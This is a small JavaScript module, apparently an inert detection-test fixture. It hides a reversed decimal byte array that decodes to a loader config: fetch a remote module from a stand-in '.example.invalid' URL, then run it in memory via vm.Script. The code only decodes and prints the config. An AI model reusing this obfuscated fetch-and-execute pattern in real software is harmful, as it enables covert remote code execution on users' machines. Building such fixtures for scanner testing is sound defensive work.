const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_574c5e9e = "[100,52,56,102,47,116,105,100,117,65,101,100,111,78,61,116,110,101,103,97,95,114,101,115,117,124,105,112,97,47,100,105,108,97,118,110,105,46,101,108,112,109,97,120,101,46,102,97,53,48,51,100,48,56,100,52,56,102,45,101,100,111,110,47,47,58,115,112,116,116,104,61,108,114,117,124,51,68,48,56,68,52,56,70,45,69,68,79,78,61,100,105,95,110,103,105,97,112,109,97,99,124,49,61,116,110,117,111,99,95,101,103,97,116,115,124,101,108,117,100,111,109,95,110,101,104,116,95,112,116,116,104,61,114,101,116,112,97,100,97,124,121,114,111,109,101,109,95,104,99,116,97,112,115,105,100,44,101,116,111,109,101,114,95,101,114,105,117,113,99,97,61,115,112,101,116,115,124,49,61,118]";

const Codec_574c5e9e = "decimal_array|reverse_bytes|";



function load_574c5e9e() { return JSON.parse(Material_574c5e9e); }

function decode_574c5e9e(EnCoDeD) { return [...EnCoDeD].reverse(); }

async function recover_574c5e9e() {

  const NeUtRaL = ["north", "south"].join(":");

  const EnCoDeD = load_574c5e9e(); let DeCoDeD = [];

  for (const stage of [decode_574c5e9e]) DeCoDeD = stage(EnCoDeD);

  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");

}

async function inspect_574c5e9e() { return (await recover_574c5e9e()).split("|").join("|"); }

async function plan_574c5e9e() { const inspect = inspect_574c5e9e; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "http_then_module", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_574c5e9e;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_574c5e9e());

